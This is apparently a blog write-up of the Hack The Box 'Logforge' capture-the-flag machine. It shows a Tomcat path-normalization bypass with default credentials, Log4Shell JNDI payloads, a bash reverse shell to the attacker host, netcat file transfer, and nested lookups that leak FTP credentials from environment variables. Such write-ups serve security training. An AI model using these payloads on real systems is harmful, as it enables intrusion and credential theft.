---
layout: post
title: HTB Logforge Writeup  
subtitle: Medium Box
thumbnail-img: /assets/img/logforge/logo.png
tags: [HTB]
---

# Notes
![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/logo.png)


| Name | Logforge |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 23 Dec 2021 |
| DIFFICULTY | Medium |

# Port Scan

IP: 10.10.11.138

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-09 22:16 EST
Nmap scan report for 10.10.11.138
Host is up (0.081s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ultimate Hacking Championship
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp filtered http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# HTTP Port 80

Looking at the main page it is just the Ultimate Hacking Championship logo, and the source code shows that it is just that.

Next steps to enumerate are to fuzz out files and directories, I use `ffuf`

```
┌──(root💀kali)-[~/htb/logforge]
└─# ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.138/FUZZ                 

       /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
         \/_/    \/_/   \/___/    \/_/       

      v1.3.1 Kali Exclusive <3
________________________________________________

:: Method           : GET
:: URL              : http://10.10.11.138/FUZZ
:: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

admin                   [Status: 403, Size: 277, Words: 20, Lines: 10]
images                  [Status: 302, Size: 0, Words: 1, Lines: 1]
manager                 [Status: 403, Size: 277, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
                       [Status: 200, Size: 489, Words: 23, Lines: 33]

```

`/admin` gives me

![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/1.png)

While going to `/images` gives me

![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/2.png)

Notice that it is running Apache 2.4.41 AND Tomcat/9.0.31

# Tomcat Login

This server has some misconfigurations that made it vulnerable to a technique described in a talk titled "Breaking Parser Logic" by Orange Tsai. https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf

If I go to the site and type `http://10.10.11.138/test/..;/manager/html` I get prompted by a login. The default creds of `tomcat;tomcat` gets me in

# Testing for Log4Shell

The name of this machine is logforge and a new vulnerability name "log4Shell" just came out so I'm assuming that one of these fields is being logged and is vulnerable.

Log4j is a Java-based framework that makes it easy to store logs and information. There is a vulnerability called "Log4Shell" that allows attackers to execute arbitrary Java code on a server or other computer, or leak sensitive information.

To test for this vulnerability I went through and put a test string of `${jndi:ldap://KALI_IP/file}` into different fields to see if it would get logged & exploited. If the server is vulnerable it will connect back to kali and request `file`. It doesn't matter what is there as we are just testing to see if we get a connection

To set up and test use netcat to listen on port 389
`nc -lvnp 389`

Then supply `${jndi:ldap://KALI_IP/file}` into input fields and see if anything connects back

I was able to get a connection (meaning its vulnerable)

![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/3.png)

![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/3.1.png)

# Exploiting Log4Shell

To exploit the vulnerability I used the "JNDI-Exploit-Kit" https://github.com/pimps/JNDI-Exploit-Kit &
ysoserial-modified https://github.com/pimps/ysoserial-modified

I had to revert JNDI Exploit Kit version because the latest version broke and would not work. To fix it run this command once you have cloned the repo. This will go back to a later version

```
┌──(root💀kali)-[/opt/log4Shell/JNDI-Exploit-Kit]
└─# git checkout 0b6925d80d453146db917616c521e7fc8419dbf7
```

#### ysoserial payload creation

/opt/log4Shell/ysoserial-modified/target
`java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/kaliIP/9002 0>&1' > ~/htb/logforge/cc5.ser`

#### JNDI server to catch request and send payload

/opt/log4Shell/JNDI-Exploit-Kit/target
`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L KALI:1389 -P /root/htb/logforge/cc5.ser`

#### Set up listener

`nc -lvnp 9002`

Then we can take a link provided from the JNDI Exploit it and pass it into the vulnerable field

```
┌──(root💀kali)-[/opt/log4Shell/JNDI-Exploit-Kit/target]          
└─# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L KALI:1389 -P /root/htb/logforge/cc5.ser                                                                                 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                
       _ _   _ _____ _____      ______            _       _ _          _  ___ _                                                                                                                    | | \ | |  __ \_   _|    |  ____|          | |     (_) |        | |/ (_) |                                                                                                             
      | |  \| | |  | || |______| |__  __  ___ __ | | ___  _| |_ ______| ' / _| |_ 
  _   | | . ` | |  | || |______|  __| \ \/ / '_ \| |/ _ \| | __|______|  < | | __|
 | |__| | |\  | |__| || |_     | |____ >  <| |_) | | (_) | | |_       | . \| | |_ 
  \____/|_| \_|_____/_____|    |______/_/\_\ .__/|_|\___/|_|\__|      |_|\_\_|\__|
                                           | |                                     
                                           |_|               created by @welk1n 
                                                             modified by @pimps 


Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://KALI:1099/uivbfy
ldap://KALI:1389/uivbfy
```

My payload looked like this `${jndi:ldap://KALIIP:1389/uivbfy}`

Then after putting it into the field I got a shell back

![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/4.png)

```
┌──(root💀kali)-[~]
└─# nc -lvnp 9002                                                                         1 ⨯
listening on [any] 9002 ...
connect to [KALI] from (UNKNOWN) [10.10.11.138] 53210
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@LogForge:/var/lib/tomcat9$ id
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

# Root

`netstat -tulnp` showed that port `21` was open.
`tcp6 0 0 :::21 :::* LISTEN`

To see what its running I'll use `ps -aux | grep ftp`. And it looks like its running a java FTP server
`root 948 0.3 1.7 3576972 70156 ? Sl 00:56 0:05 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar`

I tried to see if it was vulnerable and it is!

```
tomcat@LogForge:/$ ftp localhost
ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://KALI:9002} 
${jndi:ldap://KALI:9002} 
```

```
┌──(root💀kali)-[/opt/log4Shell/ysoserial-modified/target]
└─# nc -lvnp 9002           
listening on [any] 9002 ...
[Cconnect to [KALI]om (UNKNOWN) [10.10.11.138] 53214
0
 `
```

I tried using ysoserial again but none of the gadgets worked. I noticed that the source code `ftpServer-1.0-SNAPSHOT-all.jar` was in the root directory so I transferred it to kali to take a look

#### Logforge

```
tomcat@LogForge:/$ nc KALI 9001 < ftpServer-1.0-SNAPSHOT-all.jar
```

#### Kali

```
┌──(root💀kali)-[~/htb/logforge]
└─# nc -lvnp 9001 > ftpServer.jar                                                                                                                                                        1 ⨯
listening on [any] 9001 ...
connect to [KALI] from (UNKNOWN) [10.10.11.138] 40102
```

Now I can use `jd-gui` to pick apart this code.

It looks like it it storing the username and password in an environment variable. I can use the log4shell vulnerability to extract the variables. 
![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/5.png)

To do this we are going to edit our original payload and add a nested JDNI payload to extract the username and password. The JNDI exploit kit won't be able to catch the results but wireshark will. (make sure the JNDI server is still running)

First I created my nested payload `${jndi:ldap://KALI:1389/${env:ftp_user}}`
Then I started up wireshark and started to listen on tun0
Then I put my payload into the username of the ftp server (because its vulnerable)
After I went into wireshark and put on the filter `tcp.port == 1389` to view the request
And looking at the tcp stream I can see that the username is "ippsec"

![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/6.png)

I'll repeat the steps above except  replacing "ftp\_user" for "ftp\_password"

And I have the password now

![Logforge](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/logforge/7.png)

So our ftp creds are `ippsec:log4j_env_leakage`

We do not have permission to download root.txt but if we do `lcd /tmp` we can download it!

```bash
tomcat@LogForge:/tmp$ ftp localhost
ftp localhost
Connected to localhost.
220 Welcome to the FTP-Server
Name (localhost:tomcat): ippsec
ippsec
331 User name okay, need password
Password:log4j_env_leakage

230-Welcome to HKUST
230 User logged in successfully
Remote system type is FTP.
ftp> lcd /tmp
lcd /tmp
Local directory now /tmp
ftp> get root.txt
get root.txt
local: root.txt remote: root.txt
200 Command OK
150 Opening ASCII mode data connection for requested file root.txt
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 File transfer successful. Closing data connection.
33 bytes received in 0.00 secs (503.5400 kB/s)
ftp> 

```
